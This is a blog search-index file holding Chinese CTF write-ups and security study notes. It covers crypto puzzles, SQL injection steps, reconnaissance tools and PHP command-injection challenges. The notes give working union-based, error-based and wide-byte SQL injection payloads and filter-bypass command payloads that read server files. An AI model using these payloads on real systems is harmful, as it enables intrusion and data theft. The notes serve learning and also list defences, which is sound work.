<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title></title>
    <link href="/WXR/2025/01/24/1%E6%9C%8824%E6%97%A5%E9%A2%98%E8%A7%A3/"/>
    <url>/WXR/2025/01/24/1%E6%9C%8824%E6%97%A5%E9%A2%98%E8%A7%A3/</url>
    
    <content type="html"><![CDATA[<h1 id="1月24日题解"><a href="#1月24日题解" class="headerlink" title="1月24日题解"></a>1月24日题解</h1><h2 id="1-crypto9"><a href="#1-crypto9" class="headerlink" title="1.crypto9"></a>1.crypto9</h2><p><img src="C:\Users\wuxia\AppData\Roaming\Typora\typora-user-images\image-20250124183831135.png" alt="image-20250124183831135"></p><p>这题和以前的不一样不是单纯的密文解密</p><p>需要接文件密码</p><p>根据文件包应该是serpent加密</p><p>在线解密网站解得key为4132</p><p>打开文本解得flag</p><p>flag{c960a0f3bf871d7da2a8413ae78f7b5f}</p><h2 id="2-crypto10"><a href="#2-crypto10" class="headerlink" title="2.crypto10"></a>2.crypto10</h2><p><img src="C:\Users\wuxia\AppData\Roaming\Typora\typora-user-images\image-20250124184909950.png" alt="image-20250124184909950"></p><p> quoted-printable编码,用一个等号”&#x3D;”后跟随两个十六进制数字(0–9或A–F)来表示一个非ASCII字符</p><p>所以根据观察是一个 quoted-printable编码的密文</p><p><img src="C:\Users\wuxia\AppData\Roaming\Typora\typora-user-images\image-20250124185517601.png" alt="image-20250124185517601"></p><p>嗯嗯没想到这就是答案</p><h2 id="3-crypto11"><a href="#3-crypto11" class="headerlink" title="3.crypto11"></a>3.crypto11</h2><p><img src="C:\Users\wuxia\AppData\Roaming\Typora\typora-user-images\image-20250124185822232.png" alt="image-20250124185822232"></p><p>根据分析密文的特点可以发现是md5解密</p><p><img src="C:\Users\wuxia\AppData\Roaming\Typora\typora-user-images\image-20250124190013396.png" alt="image-20250124190013396"></p><p>根据工具解得明文为ctf</p><h2 id="4-crypto12"><a href="#4-crypto12" class="headerlink" title="4.crypto12"></a>4.crypto12</h2><p><img src="C:\Users\wuxia\AppData\Roaming\Typora\typora-user-images\image-20250124190104079.png" alt="image-20250124190104079"></p><p>这题的提示就是不用看了没提示</p><p>根据学习了解到是埃特巴什码</p><p>然后用解密工具解得明文为</p><p><img src="C:\Users\wuxia\AppData\Roaming\Typora\typora-user-images\image-20250124190256933.png" alt="image-20250124190256933"></p><h2 id="5-crypto13"><a href="#5-crypto13" class="headerlink" title="5.crypto13"></a>5.crypto13</h2><p><img src="C:\Users\wuxia\AppData\Roaming\Typora\typora-user-images\image-20250124190551475.png" alt="image-20250124190551475"></p><p>打开文件夹根据题目贝斯家族应该是base解密</p><p>flag{b4Se_Fami1y_Is_FUn}</p><p>经过多重base解密解得</p><h2 id="6-crypto14"><a href="#6-crypto14" class="headerlink" title="6.crypto14"></a>6.crypto14</h2><p><img src="C:\Users\wuxia\AppData\Roaming\Typora\typora-user-images\image-20250124191004004.png" alt="image-20250124191004004"></p><p>一堆0 1  将二进制01串转换为 16进制 得到：</p><p>3333203435203530203266203333203536203465203436203436203664203465203435203431203665203663203438203434203335203634203433203464203664203536203438203434203335203631203634203339203735203437203061</p><p>hex 解码得到：</p><p>33 45 50 2f 33 56 4e 46 46 6d 4e 45 41 6e 6c 48 44 35 64 43 4d 6d 56 48 44 35 61 64 39 75 47 0a</p><p>再次解码：</p><p>得到 3EP&#x2F;3VNFFmNEAnlHD5dCMmVHD5ad9uG</p><p>直接base64解码  不行，这里需要根据base64编码表 对这串代码进行一下 移位替换<br><img src="C:\Users\wuxia\AppData\Roaming\Typora\typora-user-images\image-20250124191207731.png" alt="image-20250124191207731"></p><h2 id="7-萌新-密码5"><a href="#7-萌新-密码5" class="headerlink" title="7.萌新_密码5"></a>7.萌新_密码5</h2><p><img src="C:\Users\wuxia\AppData\Roaming\Typora\typora-user-images\image-20250124191255899.png" alt="image-20250124191255899"></p><p>没见过这种密码通过检查发现是当铺密码</p><p>前汉字有多少笔画出头，就是转化成数字几</p><p>然后通过计算解得flag</p><h2 id="8-EZ-avbv-easy"><a href="#8-EZ-avbv-easy" class="headerlink" title="8.EZ_avbv(easy)"></a>8.EZ_avbv(easy)</h2><p><img src="C:\Users\wuxia\AppData\Roaming\Typora\typora-user-images\image-20250124193035460.png" alt="image-20250124193035460"></p><p>看题目应该是元素周期表加密</p><p>9对应 F 57对应La 64对应Ga 最终得到flag</p><h2 id="9-贝斯多少呢"><a href="#9-贝斯多少呢" class="headerlink" title="9.贝斯多少呢"></a>9.贝斯多少呢</h2><p><img src="C:\Users\wuxia\AppData\Roaming\Typora\typora-user-images\image-20250124193142820.png" alt="image-20250124193142820"></p><p>根据题目看见应该是base解密但是不知道是base多少</p><p>思路应该是将密文分段，base62解密，然后把明文拼在一起</p><p>但是，这个题没有解出来，58个字符，只能29分段，但是base62解不出来……</p><h2 id="10-find-the-table"><a href="#10-find-the-table" class="headerlink" title="10.find the table"></a>10.find the table</h2><p>也是一个元素周期表解密</p><p><img src="C:\Users\wuxia\AppData\Roaming\Typora\typora-user-images\image-20250124193451567.png" alt="image-20250124193451567"></p><p>flag{doyoulikesnow}</p><p>对照周期表解得</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/WXR/2025/01/24/sql%E6%B3%A8%E5%85%A5%E6%B5%81%E7%A8%8B%E7%AC%94%E8%AE%B0/"/>
    <url>/WXR/2025/01/24/sql%E6%B3%A8%E5%85%A5%E6%B5%81%E7%A8%8B%E7%AC%94%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="1月24日自己整理的sql注入流程的笔记"><a href="#1月24日自己整理的sql注入流程的笔记" class="headerlink" title="1月24日自己整理的sql注入流程的笔记"></a>1月24日自己整理的sql注入流程的笔记</h1><h1 id="sql注入笔记："><a href="#sql注入笔记：" class="headerlink" title="sql注入笔记："></a>sql注入笔记：</h1><h2 id="1-sql注入分类"><a href="#1-sql注入分类" class="headerlink" title="1.sql注入分类"></a>1.sql注入分类</h2><p>位置分类：GET型，POST型，Head头注入</p><p>根据反馈结果分类：有回显（显错注入）、无回显（盲注）</p><p>数据类型分类：</p><p>数字型：参数为整形</p><p>字符型：参数为字符串</p><p>数字型与字符型最大的区别在于：数字型不需要闭合，而字符型一般需要闭合。</p><h2 id="2-sql注入流程"><a href="#2-sql注入流程" class="headerlink" title="2.sql注入流程"></a>2.sql注入流程</h2><h3 id="1-寻找注入点"><a href="#1-寻找注入点" class="headerlink" title="1.寻找注入点"></a>1.寻找注入点</h3><p>sql注入 sql  和数据库有交互</p><p><strong>登录    注册    搜索框</strong>    </p><p>（可能存在注入点）</p><h3 id="2-判断类型（数字型、字符型）"><a href="#2-判断类型（数字型、字符型）" class="headerlink" title="2.判断类型（数字型、字符型）"></a>2.判断类型（数字型、字符型）</h3><p>方法：</p><p>url+?id&#x3D;1asdf（随便输入一串字符）</p><p>假如是数字型：<strong>报错</strong></p><p>假如是字符型：<strong>正常</strong></p><h3 id="3-判断闭合方式"><a href="#3-判断闭合方式" class="headerlink" title="3.判断闭合方式"></a>3.判断闭合方式</h3><p>方法：</p><p>url+?id&#x3D;1asdf</p><p>先加单引号如果没有反应再用双引号，如果双引号也没有反应，那就放弃可能不存在sql注入</p><p><img src="C:\Users\wuxia\AppData\Roaming\Typora\typora-user-images\image-20250124142253372.png" alt="image-20250124142253372"></p><p>右边剩下什么什么就是闭合方式</p><p>找对闭合方式之后在末尾加上–+</p><p>然后回车发现正常说明寻找闭合方式是对的</p><h3 id="4-判断列数"><a href="#4-判断列数" class="headerlink" title="4.判断列数"></a>4.判断列数</h3><p>判断一下数据库能否反应</p><p>?id&#x3D;1’ and 1&#x3D;1 –+（加入and 1&#x3D;1和and 1&#x3D;2）有反应说明存在sql注入漏洞</p><p><strong>判断列数用order by 数字</strong></p><p>通过反复判断确定最后列数</p><p>实例：?id&#x3D;1’ order by 3 –+</p><h3 id="5-使用联合查询union-select"><a href="#5-使用联合查询union-select" class="headerlink" title="5.使用联合查询union select"></a>5.使用联合查询union select</h3><p>实例：?id&#x3D;-1’ union select 1,2,3 –+</p><p><strong>(注意：前面的1要改成-1，判断出来几列就查询几个回显)</strong></p><h3 id="6-查询基础信息"><a href="#6-查询基础信息" class="headerlink" title="6.查询基础信息"></a>6.查询基础信息</h3><p>实例：?id&#x3D;-1’ union select 1,darabase(),3 –+</p><p><strong>先查数据库在查表明</strong></p><hr><p>查询表实例：</p><p>?id&#x3D;-1’ union select 1,(select table_name from <strong>information_schema</strong>.tabled where table_schema&#x3D;’数据库名’),3 –+</p><p>可能不显示会出现只能显示一行的提示语</p><p>我们需要修改一下代码为</p><p>?id&#x3D;-1’ union select 1,(select group_concat(table_name) from <strong>information_schema</strong>.tabled where table_schema&#x3D;’数据库名’),3 –+</p><p><strong>查完表名再查列名</strong></p><p>?id&#x3D;-1’ union select 1,(select group_concat(column_name) from <strong>information_schema</strong>.columns where table_schema&#x3D;’数据库名’ and table_name&#x3D;’表名’),3 –+</p><h3 id="7-查找列下所有的信息（具体数据）"><a href="#7-查找列下所有的信息（具体数据）" class="headerlink" title="7.查找列下所有的信息（具体数据）"></a>7.查找列下所有的信息（具体数据）</h3><p>实例：?id&#x3D;-1’ union select 1,(select group_concat(列名)from 表名),3 –+</p><h2 id="8-sql报错注入"><a href="#8-sql报错注入" class="headerlink" title="8.sql报错注入"></a>8.sql报错注入</h2><h3 id="2-常见的报错注入方法"><a href="#2-常见的报错注入方法" class="headerlink" title="2. 常见的报错注入方法"></a>2. 常见的报错注入方法</h3><p>以下是几种常见的报错注入方法及其原理：</p><h4 id="（1）group-by重复键冲突"><a href="#（1）group-by重复键冲突" class="headerlink" title="（1）group by重复键冲突"></a>（1）<code>group by</code>重复键冲突</h4><p>通过构造一个<code>group by</code>语句，使数据库因重复键值而报错。例如：</p><p>sql复制</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; and (select 1 from (select count(*),concat((select database()),floor(rand()*2))x from information_schema.tables group by x)a) --+</span><br></code></pre></td></tr></table></figure><p>该语句利用<code>group by</code>的特性，通过<code>floor(rand()*2)</code>生成重复键值，导致数据库报错，并将<code>database()</code>的值嵌入到错误信息中。</p><h4 id="（2）extractvalue-函数"><a href="#（2）extractvalue-函数" class="headerlink" title="（2）extractvalue()函数"></a>（2）<code>extractvalue()</code>函数</h4><p><code>extractvalue()</code>函数可以解析XML数据，当传入的参数格式不正确时，会返回错误信息。攻击者可以利用这一点构造恶意查询：</p><p>sql复制</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; and extractvalue(1,concat(&#x27;</span><span class="hljs-operator">^</span><span class="hljs-string">&#x27;,(select database()),&#x27;</span><span class="hljs-operator">^</span><span class="hljs-string">&#x27;)) --+</span><br></code></pre></td></tr></table></figure><p>如果数据库版本是MySQL，上述语句会返回一个错误信息，其中包含<code>database()</code>的值。</p><h4 id="（3）updatexml-函数"><a href="#（3）updatexml-函数" class="headerlink" title="（3）updatexml()函数"></a>（3）<code>updatexml()</code>函数</h4><p><code>updatexml()</code>函数用于更新XML文档中的值，如果传入的参数格式不正确，也会报错。例如：</p><p>sql复制</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">?id<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27; and updatexml(1,concat(0x7e,(select database()),0x7e),1) --+</span><br></code></pre></td></tr></table></figure><p>该语句会触发错误，并将<code>database()</code>的值嵌入到错误信息中。</p><h3 id="3-实例分析"><a href="#3-实例分析" class="headerlink" title="3. 实例分析"></a>3. 实例分析</h3><p>假设有一个用户信息查询页面，其URL参数为<code>id</code>，对应的SQL查询语句如下：</p><p>sql复制</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span> users <span class="hljs-keyword">WHERE</span> id <span class="hljs-operator">=</span> ?<br></code></pre></td></tr></table></figure><p>攻击者可以通过构造恶意的<code>id</code>值来触发报错注入。例如，攻击者输入以下URL：</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">http://example.com/user?id=<span class="hljs-number">1</span>&#x27; <span class="hljs-keyword">and</span> extractvalue(<span class="hljs-number">1</span>,concat(<span class="hljs-string">&#x27;^&#x27;</span>,(<span class="hljs-keyword">select</span> database()),<span class="hljs-string">&#x27;^&#x27;</span>)) <span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure><p>如果页面将数据库错误信息直接显示给用户，攻击者可能会看到类似以下的错误信息：</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">XPATH</span> syntax <span class="hljs-literal">error</span>: <span class="hljs-string">&#x27;^database_name^&#x27;</span><br></code></pre></td></tr></table></figure><p>通过这个错误信息，攻击者可以得知当前数据库的名称。</p><h3 id="4-防御措施"><a href="#4-防御措施" class="headerlink" title="4. 防御措施"></a>4. 防御措施</h3><p>为了避免SQL报错注入，可以采取以下措施：</p><ul><li><strong>隐藏错误信息</strong>：避免将详细的数据库错误信息直接显示给用户，而是记录到服务器日志中。</li><li><strong>使用参数化查询</strong>：避免直接拼接用户输入到SQL语句中。</li><li><strong>限制用户输入</strong>：对用户输入进行严格的验证和过滤。</li></ul><h2 id="9-sql宽字节注入"><a href="#9-sql宽字节注入" class="headerlink" title="9.sql宽字节注入"></a>9.sql宽字节注入</h2><h3 id="SQL宽字节注入详解"><a href="#SQL宽字节注入详解" class="headerlink" title="SQL宽字节注入详解"></a>SQL宽字节注入详解</h3><h4 id="1-宽字节注入原理"><a href="#1-宽字节注入原理" class="headerlink" title="1. 宽字节注入原理"></a>1. 宽字节注入原理</h4><p>宽字节注入是一种利用字符编码漏洞的SQL注入攻击技术。它主要利用了应用程序在处理用户输入时，未对字符编码进行正确处理，导致攻击者可以通过插入特殊编码的宽字符来绕过输入过滤和SQL语句构造的限制。</p><p>在GBK或GB2312等宽字节编码中，一个汉字通常由两个字节组成。如果MySQL数据库使用GBK编码，当遇到ASCII值大于128的字符时，会将其与后续的一个字节组合成一个汉字。攻击者可以利用这一特性，通过构造特定的宽字节字符，使原本被转义的特殊字符（如单引号 <code>&#39;</code>）重新成为有效的注入点。</p><h4 id="2-宽字节注入的实现条件"><a href="#2-宽字节注入的实现条件" class="headerlink" title="2. 宽字节注入的实现条件"></a>2. 宽字节注入的实现条件</h4><p>宽字节注入的实现需要满足以下条件：</p><ol><li>数据库使用GBK或GB2312等宽字节编码。</li><li>应用程序对用户输入进行了转义处理（如使用<code>addslashes()</code>函数），但未正确处理宽字节字符。</li></ol><h4 id="3-宽字节注入的构造方法"><a href="#3-宽字节注入的构造方法" class="headerlink" title="3. 宽字节注入的构造方法"></a>3. 宽字节注入的构造方法</h4><p>假设目标网站使用GBK编码，并且对用户输入进行了<code>addslashes()</code>转义。正常情况下，单引号 <code>&#39;</code> 会被转义为 <code>\&#39;</code>，导致注入失效。攻击者可以通过在单引号前插入一个ASCII值大于128的字节（如<code>%df</code>），构造宽字节字符来绕过转义。</p><p>例如：</p><ul><li>正常注入：<code>id=1&#39;</code>，转义后变为<code>id=1\&#39;</code>，注入失效。</li><li>宽字节注入：<code>id=1%df&#39;</code>，转义后变为<code>id=1%df\&#39;</code>，MySQL将<code>%df\</code>解析为一个汉字，单引号 <code>&#39;</code> 成功逃逸。</li></ul><h4 id="4-实例分析"><a href="#4-实例分析" class="headerlink" title="4. 实例分析"></a>4. 实例分析</h4><p>以下是一个宽字节注入的实例分析：</p><h5 id="示例1：绕过addslashes-转义"><a href="#示例1：绕过addslashes-转义" class="headerlink" title="示例1：绕过addslashes()转义"></a>示例1：绕过<code>addslashes()</code>转义</h5><p>假设目标网站的URL参数<code>id</code>存在SQL注入漏洞，但被<code>addslashes()</code>转义：</p><ol><li>测试注入点：<code>http://example.com/index.php?id=1&#39;</code><ul><li>转义后SQL语句为：<code>SELECT * FROM users WHERE id = &#39;1\&#39;&#39;</code>，注入失效。</li></ul></li><li>构造宽字节注入：<code>http://example.com/index.php?id=1%df&#39;</code><ul><li>转义后SQL语句为：<code>SELECT * FROM users WHERE id = &#39;1%df\&#39;&#39;</code>，MySQL将<code>%df\</code>解析为一个汉字，单引号 <code>&#39;</code> 成功逃逸。</li></ul></li></ol><h5 id="示例2：获取数据库信息"><a href="#示例2：获取数据库信息" class="headerlink" title="示例2：获取数据库信息"></a>示例2：获取数据库信息</h5><p>假设目标网站的<code>id</code>参数存在宽字节注入漏洞：</p><ol><li><p>测试注入点：<code>http://example.com/index.php?id=1%df&#39;</code></p><ul><li>页面报错或返回异常结果，说明单引号成功逃逸。</li></ul></li><li><p>构造联合查询获取数据库名：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://example.com/index.php?id=<span class="hljs-number">1</span>%df&#x27; union select <span class="hljs-number">1</span>,database(),<span class="hljs-number">3</span> --+<br></code></pre></td></tr></table></figure><ul><li>成功返回数据库名。</li></ul></li><li><p>进一步获取表名和列名：</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">http://example.com/index.php?id=1%df&#x27; union <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,table_name,<span class="hljs-number">3</span> <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema=<span class="hljs-keyword">database</span>() --+<br></code></pre></td></tr></table></figure><ul><li>成功返回表名。</li></ul></li></ol><h4 id="5-防御措施"><a href="#5-防御措施" class="headerlink" title="5. 防御措施"></a>5. 防御措施</h4><p>为了防止宽字节注入攻击，可以采取以下措施：</p><ol><li><strong>统一字符编码</strong>：将应用程序和数据库的字符编码统一为UTF-8，避免GBK等宽字节编码带来的问题。</li><li><strong>使用参数化查询</strong>：避免直接将用户输入拼接到SQL语句中，使用参数化查询或预编译语句。</li><li><strong>严格输入验证</strong>：对用户输入进行严格验证和过滤，去除非法字符。</li></ol>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/WXR/2025/01/24/1%E6%9C%8824%E6%97%A5%E5%B0%8F%E8%BF%AA/"/>
    <url>/WXR/2025/01/24/1%E6%9C%8824%E6%97%A5%E5%B0%8F%E8%BF%AA/</url>
    
    <content type="html"><![CDATA[<p><strong>1月24日小迪</strong></p><h1 id="14-红队攻击篇"><a href="#14-红队攻击篇" class="headerlink" title="14.红队攻击篇"></a>14.红队攻击篇</h1><p>1、网络空间四大引擎-Fofa＆Quake＆Shodan＆Zoomeye<br>2、自动化信息收集项目-ARL灯塔＆Su1ze水泽＆Kunyu坤舆<br>3、单点功能信息收集项目-企查：子域名：指纹识别＆社工信息</p><p>黑暗引擎：<br><a href="https://fofa.so/">https://fofa.so</a><br><a href="https://quake.360.cn/">https://quake.360.cn</a><br><a href="https://www.shodan.io/">https://www.shodan.io</a><br><a href="https://www.zocmeye.org/">https://www.zocmeye.org</a><br>自动项目：<br><a href="https://github.com/knownsec/Kunyu">https://github.com/knownsec/Kunyu</a><br><a href="https://github.com/0x727/Shu1Ze_0x727">https://github.com/0x727/Shu1Ze_0x727</a><br><a href="https://github.com/TophantTechnology/ARL">https://github.com/TophantTechnology/ARL</a><br>相关资源：<br><a href="https://forum.ywhack.com/center.php">https://forum.ywhack.com/center.php</a></p><h3 id="网络空间搜索引擎"><a href="#网络空间搜索引擎" class="headerlink" title="网络空间搜索引擎"></a>网络空间搜索引擎</h3><ol><li><strong>FOFA</strong><br>FOFA是由华顺信安推出的网络空间测绘搜索引擎，能够通过关键字、IP地址、端口号、协议等多种方式进行搜索。它可以帮助用户快速定位和发现互联网上的目标，广泛应用于网络安全研究和态势感知。</li><li><strong>Quake</strong><br>Quake是由360网络安全响应中心（360-CERT）自主研发的全网空间测绘系统，能够对全球IPv4和IPv6地址进行持续性测绘。它结合了人工智能和机器学习技术，具备精准发现和识别全网资产设备的能力。</li><li><strong>Shodan</strong><br>Shodan被称为“物联网搜索引擎”，专注于发现和索引互联网上连接的各种设备和服务。它通过扫描开放的TCP&#x2F;IP端口来收集设备信息，支持多种过滤条件，广泛用于网络安全研究和漏洞检测。</li><li><strong>ZoomEye</strong><br>ZoomEye是由知道创宇旗下的404实验室开发的网络空间搜索引擎，通过分布在全球的测绘节点，对IPv4、IPv6地址库及网站域名库进行不间断探测。它能够实现对网络空间的动态测绘画像，并提供丰富的数据支持。</li></ol><h3 id="自动化信息收集工具"><a href="#自动化信息收集工具" class="headerlink" title="自动化信息收集工具"></a>自动化信息收集工具</h3><ol><li><strong>ARL灯塔</strong><br>ARL灯塔是一款基于FOFA API开发的信息收集工具，可以对目标进行信息收集，并通过邮箱或钉钉通知用户。它支持GitHub最新项目通知，适合用于APT（高级持续性威胁）攻击的前期信息收集。</li><li><strong>Suize水泽</strong><br>Suize水泽与ARL灯塔类似，但在信息收集方面更为广泛，包括企业信息、持股公司等。它与ARL灯塔各有优劣，适用于更全面的信息收集场景。</li><li><strong>Kunyu</strong><br>Kunyu（坤舆）是一款网络空间信息收集工具，专注于对目标的多维度信息收集和分析。它通常结合其他工具使用，以增强信息收集的深度和广度。</li></ol><h3 id="单点功能信息收集工具"><a href="#单点功能信息收集工具" class="headerlink" title="单点功能信息收集工具"></a>单点功能信息收集工具</h3><ol><li><strong>企查</strong><br>企查工具主要用于收集企业相关信息，包括公司背景、注册信息、股东结构等。它在网络安全领域常用于目标企业的前期调研和情报收集。</li><li><strong>子域名收集</strong><br>子域名收集工具用于发现目标域名下的所有子域名。这些工具通过各种技术手段（如DNS查询、爬虫等）获取子域名信息，帮助攻击者或安全研究人员了解目标网络的结构。</li><li><strong>指纹识别</strong><br>指纹识别工具用于识别目标系统的技术栈和服务信息。通过分析目标的响应头、页面内容等，这些工具可以快速确定目标使用的技术框架、中间件版本等信息。</li><li><strong>社工信息收集</strong><br>社工信息收集工具用于收集目标的社交工程学相关信息，例如邮箱、手机号、社交媒体账号等。这些信息可用于社会工程学攻击或辅助其他攻击手段。</li></ol><p>这些工具和项目在网络空间测绘、信息收集和安全研究中具有重要作用，但也需要谨慎使用，以确保符合法律法规和道德规范。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/WXR/2025/01/23/1%E6%9C%8823%E5%8F%B7%E9%A2%98%E8%A7%A3/"/>
    <url>/WXR/2025/01/23/1%E6%9C%8823%E5%8F%B7%E9%A2%98%E8%A7%A3/</url>
    
    <content type="html"><![CDATA[<h1 id="1月23日题解"><a href="#1月23日题解" class="headerlink" title="1月23日题解"></a>1月23日题解</h1><h2 id="1-web37"><a href="#1-web37" class="headerlink" title="1.web37"></a>1.web37</h2><p><img src="C:\Users\wuxia\AppData\Roaming\Typora\typora-user-images\image-20250123185637351.png" alt="image-20250123185637351"></p><p>观察一下代码，使用php伪协议</p><p>?c&#x3D;php:&#x2F;&#x2F;input</p><p>可以使用playload：?c&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,<?php system('tac f*')?></p><p><img src="C:\Users\wuxia\AppData\Roaming\Typora\typora-user-images\image-20250123190248146.png" alt="image-20250123190248146"></p><p>解得flag</p><h2 id="2-web38"><a href="#2-web38" class="headerlink" title="2.web38"></a>2.web38</h2><p><img src="C:\Users\wuxia\AppData\Roaming\Typora\typora-user-images\image-20250123190604368.png" alt="image-20250123190604368"></p><p>打开链接看到题目发现这题又过滤了php和file</p><p>没有提前条件绕过</p><p>构造 payload：</p><p>?c&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,<?=system('tac f*')?></p><p><img src="C:\Users\wuxia\AppData\Roaming\Typora\typora-user-images\image-20250123190717189.png" alt="image-20250123190717189"></p><p>解得flag</p><h2 id="3-web39"><a href="#3-web39" class="headerlink" title="3.web39"></a>3.web39</h2><p><img src="C:\Users\wuxia\AppData\Roaming\Typora\typora-user-images\image-20250123190942037.png" alt="image-20250123190942037"></p><p>由于它把 flag 过滤掉了，而且这里包含后也没有输出 $flag 的语句</p><p>可以将整个 php 代码闭合掉，让 .php 不执行而是被直接显示</p><p>?c&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,<?php system('cat f*')?>)?&gt;、</p><p><img src="C:\Users\wuxia\AppData\Roaming\Typora\typora-user-images\image-20250123191222746.png" alt="image-20250123191222746"></p><p>然后打开源代码看大flag解得此题</p><p><img src="C:\Users\wuxia\AppData\Roaming\Typora\typora-user-images\image-20250123191251950.png" alt="image-20250123191251950"></p><h2 id="4-web40"><a href="#4-web40" class="headerlink" title="4.web40"></a>4.web40</h2><p><img src="C:\Users\wuxia\AppData\Roaming\Typora\typora-user-images\image-20250123191615595.png" alt="image-20250123191615595"></p><p>打开链接看看题目发现基本上所有的符号都过滤掉了，但是发现过滤的是中文括号，英文括号还可以使用</p><p>使用无参数的playload</p><p>?c&#x3D;show_source(next(array_reverse(scandir(pos(localeconv())))));</p><p><img src="C:\Users\wuxia\AppData\Roaming\Typora\typora-user-images\image-20250123191945543.png" alt="image-20250123191945543"></p><p>即可解得flag</p><h2 id="5-web41"><a href="#5-web41" class="headerlink" title="5.web41"></a>5.web41</h2><p><img src="C:\Users\wuxia\AppData\Roaming\Typora\typora-user-images\image-20250123192852216.png" alt="image-20250123192852216"></p><p>观察题目发现过滤了很多东西</p><p>用bp抓包一下</p><p>然后send to repeater发现又回显</p><p>然后构造一下</p><p>c&#x3D;(“%13%19%13%14%05%0d”|”%60%60%60%60%60%60”)(“%03%01%14%00%06%0c%01%07%00%10%08%10”|”%60%60%60%20%60%60%60%60%2e%60%60%60”)</p><p><img src="C:\Users\wuxia\AppData\Roaming\Typora\typora-user-images\image-20250123193315037.png" alt="image-20250123193315037"></p><p>解得flag</p><h2 id="6-web42"><a href="#6-web42" class="headerlink" title="6.web42"></a>6.web42</h2><p><img src="C:\Users\wuxia\AppData\Roaming\Typora\typora-user-images\image-20250123193703902.png" alt="image-20250123193703902"></p><p>使用方法：url + ?c&#x3D;cat flag.php ||</p><p><img src="C:\Users\wuxia\AppData\Roaming\Typora\typora-user-images\image-20250123193746746.png" alt="image-20250123193746746"></p><p>打开之后是一片空白然后打开源代码</p><p>发现flag</p><p><img src="C:\Users\wuxia\AppData\Roaming\Typora\typora-user-images\image-20250123193820465.png" alt="image-20250123193820465"></p><p>解得flag</p><h2 id="7-web43"><a href="#7-web43" class="headerlink" title="7.web43"></a>7.web43</h2><p><img src="C:\Users\wuxia\AppData\Roaming\Typora\typora-user-images\image-20250123194052050.png" alt="image-20250123194052050"></p><p>与上题方法差不多但是要改一下代码</p><p>url + ?c&#x3D;nl flag.php%0a</p><p><img src="C:\Users\wuxia\AppData\Roaming\Typora\typora-user-images\image-20250123194135046.png" alt="image-20250123194135046"></p><p>打开只有一个1</p><p><img src="C:\Users\wuxia\AppData\Roaming\Typora\typora-user-images\image-20250123194150388.png" alt="image-20250123194150388"></p><p>然后直接打开源代码可以找到flag</p><p>解得此题</p><h2 id="8-web44"><a href="#8-web44" class="headerlink" title="8.web44"></a>8.web44</h2><p><img src="C:\Users\wuxia\AppData\Roaming\Typora\typora-user-images\image-20250123194410025.png" alt="image-20250123194410025"></p><p>使用最简单的方法就是</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">url + ?c=<span class="hljs-built_in">tac</span> fl*%0A<br></code></pre></td></tr></table></figure><p><img src="C:\Users\wuxia\AppData\Roaming\Typora\typora-user-images\image-20250123194454848.png" alt="image-20250123194454848"></p><p>使用之后发现flag直接显示出来了</p><h2 id="9-web45"><a href="#9-web45" class="headerlink" title="9.web45"></a>9.web45</h2><p><img src="C:\Users\wuxia\AppData\Roaming\Typora\typora-user-images\image-20250123200058456.png" alt="image-20250123200058456"></p><p>最简单的方法就是使用 %09 绕过即可</p><p>url + ?c&#x3D;tac%09fl’’ag.php||</p><p><img src="C:\Users\wuxia\AppData\Roaming\Typora\typora-user-images\image-20250123200140432.png" alt="image-20250123200140432"></p><p>使用这个回车就可以看到flag</p><p>此题解得</p><h2 id="10-web46"><a href="#10-web46" class="headerlink" title="10.web46"></a>10.web46</h2><p><img src="C:\Users\wuxia\AppData\Roaming\Typora\typora-user-images\image-20250123200400507.png" alt="image-20250123200400507"></p><p>根据题目线索发现可以用符号绕过</p><p>url + ?c&#x3D;tac%09fl’’ag.php||</p><p>在url地址后面加上代码解得此题</p><p><img src="C:\Users\wuxia\AppData\Roaming\Typora\typora-user-images\image-20250123200500614.png" alt="image-20250123200500614"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/WXR/2025/01/23/1%E6%9C%8823%E6%97%A5%E5%B0%8F%E8%BF%AA/"/>
    <url>/WXR/2025/01/23/1%E6%9C%8823%E6%97%A5%E5%B0%8F%E8%BF%AA/</url>
    
